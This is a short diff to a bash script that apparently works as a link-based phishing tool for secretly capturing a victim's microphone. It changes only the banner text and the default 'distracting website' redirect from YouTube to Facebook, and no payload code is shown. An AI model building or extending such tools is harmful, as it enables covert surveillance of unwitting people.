@@ -6,7 +6,7 @@ trap 'printf "\n";stop' 2
 banner() {
 
  
-printf "\e[1;92m ℍ𝕒𝕔𝕜 𝕞𝕚𝕔𝕣𝕠𝕡𝕙𝕠𝕟𝕖 𝕓𝕪 𝕤𝕖𝕟𝕕𝕚𝕟𝕘 𝕝𝕚𝕟𝕜  \e[0m\n"
+printf "\e[1;92m Hack microphone by sending link  \e[0m\n"
 printf "\e[1;92m                  \e[0m\n"
 
 
@@ -184,7 +184,7 @@ default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 
-default_redirect="https://youtube.com"
+default_redirect="https://facebook.com"
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m ): \e[0m" $default_redirect
 read redirect_link
 redirect_link="${redirect_link:-${default_redirect}}"
